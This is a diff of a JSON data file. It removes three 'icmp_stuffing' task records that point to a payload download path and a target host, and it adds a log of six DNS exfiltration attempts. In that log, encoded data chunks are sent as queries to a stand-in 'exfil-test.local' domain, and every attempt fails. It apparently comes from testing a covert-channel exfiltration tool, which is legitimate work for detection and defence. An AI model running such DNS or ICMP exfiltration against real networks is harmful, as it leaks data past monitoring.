@@ -1,33 +1,68 @@
-{
-  "task_id": "TASK-550",
-  "type": "icmp_stuffing",
-  "payload_ref": {
-    "payload_id": "icmp_stuff", 
-    "url": "/api/agent/payload/icmp_stuff/download/",
-    "size": 2000
+[
+  {
+    "technique": "dns",
+    "sequence": 1,
+    "query_domain": "lngusqkufvcvqrsjjqwvgsknlvntgzjr.001.e2d2f412.exfil-test.local",
+    "encoded_label": "lngusqkufvcvqrsjjqwvgsknlvntgzjr",
+    "label_length": 32,
+    "raw_bytes": 20,
+    "outcome": "ERROR: All nameservers failed to answer the query lngusqkufvcvqrsjjqwvgsknlvntgzjr.001.e2d2f412.exfil-test.local. IN A: Server Do53:127.0.0.1@53 answered [WinError 10054] An existing connection was forcibly closed by the remote host",
+    "elapsed_ms": 0.0,
+    "timestamp": "2026-06-02T14:50:09.943614+00:00"
   },
-  "target": "10.0.0.5",
-  "repeat": 50
-}
-{
-  "task_id": "TASK-650",
-  "type": "icmp_stuffing",
-  "payload_ref": {
-    "payload_id": "icmp_stuff", 
-    "url": "/api/agent/payload/icmp_stuff/download/",
-    "size": 1400
+  {
+    "technique": "dns",
+    "sequence": 2,
+    "query_domain": "meygmyrylvntembsgyydmmbskqytinjq.002.e2d2f412.exfil-test.local",
+    "encoded_label": "meygmyrylvntembsgyydmmbskqytinjq",
+    "label_length": 32,
+    "raw_bytes": 20,
+    "outcome": "ERROR: All nameservers failed to answer the query meygmyrylvntembsgyydmmbskqytinjq.002.e2d2f412.exfil-test.local. IN A: Server Do53:127.0.0.1@53 answered [WinError 10054] An existing connection was forcibly closed by the remote host",
+    "elapsed_ms": 0.0,
+    "timestamp": "2026-06-02T14:50:19.956568+00:00"
   },
-  "target": "10.0.0.5",
-  "repeat": 50
-}
-{
-  "task_id": "TASK-750",
-  "type": "icmp_stuffing",
-  "payload_ref": {
-    "payload_id": "icmp_stuff", 
-    "url": "/api/agent/payload/icmp_stuff/download/",
-    "size": 3490
+  {
+    "technique": "dns",
+    "sequence": 3,
+    "query_domain": "ga4vuxjaovzwk4tomfwwkplbmrwws3rg.003.e2d2f412.exfil-test.local",
+    "encoded_label": "ga4vuxjaovzwk4tomfwwkplbmrwws3rg",
+    "label_length": 32,
+    "raw_bytes": 20,
+    "outcome": "ERROR: All nameservers failed to answer the query ga4vuxjaovzwk4tomfwwkplbmrwws3rg.003.e2d2f412.exfil-test.local. IN A: Server Do53:127.0.0.1@53 answered [WinError 10054] An existing connection was forcibly closed by the remote host",
+    "elapsed_ms": 0.0,
+    "timestamp": "2026-06-02T14:50:29.969993+00:00"
   },
-  "target": "10.0.0.5",
-  "repeat": 50
-}
+  {
+    "technique": "dns",
+    "sequence": 4,
+    "query_domain": "obqxg43xn5zgipkqibzxg5zqojsdcmrt.004.e2d2f412.exfil-test.local",
+    "encoded_label": "obqxg43xn5zgipkqibzxg5zqojsdcmrt",
+    "label_length": 32,
+    "raw_bytes": 20,
+    "outcome": "ERROR: All nameservers failed to answer the query obqxg43xn5zgipkqibzxg5zqojsdcmrt.004.e2d2f412.exfil-test.local. IN A: Server Do53:127.0.0.1@53 answered [WinError 10054] An existing connection was forcibly closed by the remote host",
+    "elapsed_ms": 0.0,
+    "timestamp": "2026-06-02T14:50:39.981024+00:00"
+  },
+  {
+    "technique": "dns",
+    "sequence": 5,
+    "query_domain": "ez2g623fny6wk6kknbreoy3jj5uuuu2v.005.e2d2f412.exfil-test.local",
+    "encoded_label": "ez2g623fny6wk6kknbreoy3jj5uuuu2v",
+    "label_length": 32,
+    "raw_bytes": 20,
+    "outcome": "ERROR: All nameservers failed to answer the query ez2g623fny6wk6kknbreoy3jj5uuuu2v.005.e2d2f412.exfil-test.local. IN A: Server Do53:127.0.0.1@53 answered [WinError 10054] An existing connection was forcibly closed by the remote host",
+    "elapsed_ms": 0.0,
+    "timestamp": "2026-06-02T14:50:49.998335+00:00"
+  },
+  {
+    "technique": "dns",
+    "sequence": 6,
+    "query_domain": "pjetcttjji4q.006.e2d2f412.exfil-test.local",
+    "encoded_label": "pjetcttjji4q",
+    "label_length": 12,
+    "raw_bytes": 7,
+    "outcome": "ERROR: All nameservers failed to answer the query pjetcttjji4q.006.e2d2f412.exfil-test.local. IN A: Server Do53:127.0.0.1@53 answered [WinError 10054] An existing connection was forcibly closed by the remote host",
+    "elapsed_ms": 0.0,
+    "timestamp": "2026-06-02T14:50:50.006404+00:00"
+  }
+]
